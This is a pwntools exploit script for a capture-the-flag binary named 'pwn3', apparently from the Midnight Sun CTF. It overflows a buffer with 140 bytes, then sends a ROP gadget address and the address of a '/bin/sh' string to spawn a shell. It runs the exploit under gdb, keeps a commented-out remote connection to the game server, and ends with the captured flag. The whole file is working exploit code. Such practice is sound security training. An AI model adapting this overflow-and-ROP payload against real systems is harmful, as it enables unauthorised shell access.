from pwn import *


bin_sh = 0x00049018

context.binary = elf = ELF('./pwn3')
# bss = elf.bss(0x140)
offset = "A"*140  
# p = remote("pwn3-01.play.midnightsunctf.se", 10003)
# rop = ROP(elf)
# rop.call(system,bin_sh)
p = gdb.debug('./pwn3', 'init-gef\nb *0x0001fb5c\nb *0x10364')
# p = process(['qemu-arm','./pwn3'])
gadget = 0x0001fb5c
# chain = flat([
#     gadget,
#     bin_sh,
#     0,
#     system
# ])
# system = 
payload = offset + p32(gadget)+p32(bin_sh)*2+p32(0x0014b5c-1)

p.sendlineafter("buffer: ", payload)

p.interactive()
# midnight{the_pwn_knight_16435f41118a38dd}
